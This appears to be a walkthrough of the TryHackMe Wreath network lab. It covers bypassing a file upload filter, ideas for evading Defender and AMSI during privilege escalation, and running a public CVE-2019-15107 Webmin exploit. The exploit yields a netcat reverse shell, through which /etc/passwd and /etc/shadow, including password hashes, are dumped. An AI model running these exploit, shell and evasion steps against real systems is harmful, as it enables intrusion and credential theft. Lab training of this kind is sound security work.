+This checks to see if the result returned by the `explode()` method is _not_ in an array called `$goodExts`. In other words, this is a whitelist approach where only certain extensions will be accepted. The accepted extension list can be found in line 5 of the file.
+---
+Which extensions are accepted (comma separated, no spaces or quotes)?
+ext1,ext2,ext3,ext4
+*jpg,jpeg,png,gif*
+Between lines 4 and 15:
+`$target = "uploads/".basename($_FILES["file"]["name"]);   ...   move_uploaded_file($_FILES["file"]["tmp_name"], $target);   `
+We can see that the file will get moved into an `uploads/` directory with it's original name, assuming it passed the two filters.
+In summary:
+- We know how to find our uploaded files
+- There are two file upload filters in play
+- Both filters are bypassable
+We have ourselves a vulnerability!
+Completed
+[**Video**](https://youtu.be/gwduHsnFdGw)
+We have a reverse shell on the third and final target -- this is cause for celebration!
+We don't yet have full system access to the target though. As we saw when we first obtained the webshell, the webserver was (un)fortunately not running with system permissions (contrary to the Xampp defaults), which leaves us with a low-privilege account. Looks like Thomas was sensible with his security on his own PC!
+This does mean that we're going to need to enumerate the target for privesc vectors though -- and with Defender active, we'll have to do it quietly. Let's consider our options:
+- We could (and should) always start with a little manual enumeration. This will be relatively quiet and gives us a baseline to work with
+- Defender would _definitely_ catch a regular copy of WinPEAS; however, it would be unlikely to catch either the `.bat` version or the obfuscated `.exe` version, both of which are released in the [PEAS repository](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/) alongside the regular version
+- Chances are that AMSI will alert Defender if we try to load any PowerShell privesc check scripts (e.g. PowerUp), so we'd ideally be looking for obfuscated versions of these if we were to use them
+We'll start with some manual enumeration and hopefully come up with something workable!
+Answer the questions below
+
+## Exploitation
+[**Video**](https://youtu.be/hu4d6nexAog)
+In the previous task we found a vulnerable service[[1]](https://sensorstechforum.com/cve-2019-15107-webmin/)[[2]](https://www.webmin.com/exploit.html) running on the target which will give us the ability to execute commands on the target.
+The next step would usually be to find an exploit for this vulnerability. There are often exploits available online for known vulnerabilities (and we will cover searching for these in an upcoming task!), however, in this instance, an exploit is provided [here](https://github.com/MuirlandOracle/CVE-2019-15107).
+---
+Start by cloning the repository. This can be done with the following command:
+`git clone https://github.com/MuirlandOracle/CVE-2019-15107`
+This creates a local copy of the exploit on our attacking machine. Navigate into the folder then install the required Python libraries:
+`cd CVE-2019-15107 && pip3 install -r requirements.txt`
+If this doesn't work, you may need to install pip before downloading the libraries. This can be done with:
+`sudo apt install python3-pip`
+The script should already be executable, but if not, add the executable bit (`chmod +x ./CVE-2019-15107.py`).
+Never run an unknown script from the internet! Read through the code and see if you can get an idea of what it's doing. (Don't worry if you aren't familiar with Python -- in this case the exploit was coded by the author of this content and is being run in a lab environment, so you can infer that it isn't malicious. It is, however, good practice to read through scripts before running them).
+Once you're satisfied that the script will do what it says it will, run the exploit against the target!
+`./CVE-2019-15107.py TARGET_IP`
+![Demonstration of the exploit](https://assets.tryhackme.com/additional/wreath-network/a876ed2dd7ce.png)
+---
+[1] [https://sensorstechforum.com/cve-2019-15107-webmin/](https://sensorstechforum.com/cve-2019-15107-webmin/)
+[2] [https://www.webmin.com/exploit.html](https://www.webmin.com/exploit.html)
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/MuirlandOracle/CVE-2019-15107
+Cloning into 'CVE-2019-15107'...
+remote: Enumerating objects: 32, done.
+remote: Counting objects: 100% (32/32), done.
+remote: Compressing objects: 100% (26/26), done.
+remote: Total 32 (delta 11), reused 12 (delta 3), pack-reused 0
+Receiving objects: 100% (32/32), 19.95 KiB | 1.66 MiB/s, done.
+Resolving deltas: 100% (11/11), done.
+
+──(witty㉿kali)-[~/Downloads]
+└─$ cd CVE-2019-15107 && pip3 install -r requirements.txt
+Defaulting to user installation because normal site-packages is not writeable
+Collecting argparse
+  Downloading argparse-1.4.0-py2.py3-none-any.whl (23 kB)
+Requirement already satisfied: requests in /home/witty/.local/lib/python3.11/site-packages (from -r requirements.txt (line 2)) (2.22.0)
+Requirement already satisfied: urllib3 in /home/witty/.local/lib/python3.11/site-packages (from -r requirements.txt (line 3)) (1.25.11)
+Requirement already satisfied: prompt_toolkit in /usr/lib/python3/dist-packages (from -r requirements.txt (line 4)) (3.0.36)
+Requirement already satisfied: chardet<3.1.0,>=3.0.2 in /home/witty/.local/lib/python3.11/site-packages (from requests->-r requirements.txt (line 2)) (3.0.4)
+Requirement already satisfied: idna<2.9,>=2.5 in /home/witty/.local/lib/python3.11/site-packages (from requests->-r requirements.txt (line 2)) (2.8)
+Requirement already satisfied: certifi>=2017.4.17 in /home/witty/.local/lib/python3.11/site-packages (from requests->-r requirements.txt (line 2)) (2022.9.24)
+Installing collected packages: argparse
+Successfully installed argparse-1.4.0
+
+──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ chmod +x ./CVE-2019-15107.py
+                                                                                
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ./CVE-2019-15107.py 10.200.84.200
+
+	__        __   _               _         ____   ____ _____ 
+	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
+	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
+	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+
+						@MuirlandOracle
+
+		
+[*] Server is running in SSL mode. Switching to HTTPS
+[+] Connected to https://10.200.84.200:10000/ successfully.
+[+] Server version (1.890) should be vulnerable!
+[+] Benign Payload executed!
+
+[+] The target is vulnerable and a pseudoshell has been obtained.
+Type commands to have them executed on the target.
+[*] Type 'exit' to exit.
+[*] Type 'shell' to obtain a full reverse shell (UNIX only).
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
+└─$ ./CVE-2019-15107.py 10.200.84.200
+
+	__        __   _               _         ____   ____ _____ 
+	\ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|
+	 \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|  
+	  \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___ 
+	   \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|
+
+						@MuirlandOracle
+
+		
+[*] Server is running in SSL mode. Switching to HTTPS
+[+] Connected to https://10.200.84.200:10000/ successfully.
+[+] Server version (1.890) should be vulnerable!
+[+] Benign Payload executed!
+
+[+] The target is vulnerable and a pseudoshell has been obtained.
+Type commands to have them executed on the target.
+[*] Type 'exit' to exit.
+[*] Type 'shell' to obtain a full reverse shell (UNIX only).
+```
+```text
+# shell
+
+[*] Starting the reverse shell process
+[*] For UNIX targets only!
+[*] Use 'exit' to return to the pseudoshell at any time
+Please enter the IP address for the shell: 10.50.85.48
+Please enter the port number for the shell: 1337
+
+[*] Start a netcat listener in a new window (nc -lvnp 1337) then press enter.
+
+[+] You should now have a reverse shell on the target
+[*] If this is not the case, please check your IP and chosen port
+If these are correct then there is likely a firewall preventing the reverse connection. Try choosing a well-known port such as 443 or 53
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337                                      
+listening on [any] 1337 ...
+ls
+
+                                                                                  
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.50.85.48] from (UNKNOWN) [10.200.84.200] 58046
+sh: cannot set terminal process group (1823): Inappropriate ioctl for device
+sh: no job control in this shell
+sh-4.4# whoami
+whoami
+root
+
+sh-4.4# cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:65534:65534:Kernel Overflow User:/:/sbin/nologin
+dbus:x:81:81:System message bus:/:/sbin/nologin
+systemd-coredump:x:999:997:systemd Core Dumper:/:/sbin/nologin
+systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
+polkitd:x:998:996:User for polkitd:/:/sbin/nologin
+libstoragemgmt:x:997:995:daemon account for libstoragemgmt:/var/run/lsm:/sbin/nologin
+cockpit-ws:x:996:993:User for cockpit web service:/nonexisting:/sbin/nologin
+cockpit-wsinstance:x:995:992:User for cockpit-ws instances:/nonexisting:/sbin/nologin
+sssd:x:994:990:User for sssd:/:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+chrony:x:993:989::/var/lib/chrony:/sbin/nologin
+rngd:x:992:988:Random Number Generator Daemon:/var/lib/rngd:/sbin/nologin
+twreath:x:1000:1000:Thomas Wreath:/home/twreath:/bin/bash
+unbound:x:991:987:Unbound DNS resolver:/etc/unbound:/sbin/nologin
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+nginx:x:990:986:Nginx web server:/var/lib/nginx:/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/sbin/nologin
+sh-4.4# cat /etc/shadow
+root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::
+bin:*:18358:0:99999:7:::
+daemon:*:18358:0:99999:7:::
+adm:*:18358:0:99999:7:::
+lp:*:18358:0:99999:7:::
+sync:*:18358:0:99999:7:::
+shutdown:*:18358:0:99999:7:::
+halt:*:18358:0:99999:7:::
+mail:*:18358:0:99999:7:::
+operator:*:18358:0:99999:7:::
+games:*:18358:0:99999:7:::
+ftp:*:18358:0:99999:7:::
+nobody:*:18358:0:99999:7:::
+dbus:!!:18573::::::
+systemd-coredump:!!:18573::::::
+systemd-resolve:!!:18573::::::
+tss:!!:18573::::::
+polkitd:!!:18573::::::
+libstoragemgmt:!!:18573::::::
+cockpit-ws:!!:18573::::::
+cockpit-wsinstance:!!:18573::::::
+sssd:!!:18573::::::
+sshd:!!:18573::::::
+chrony:!!:18573::::::
+rngd:!!:18573::::::
+twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
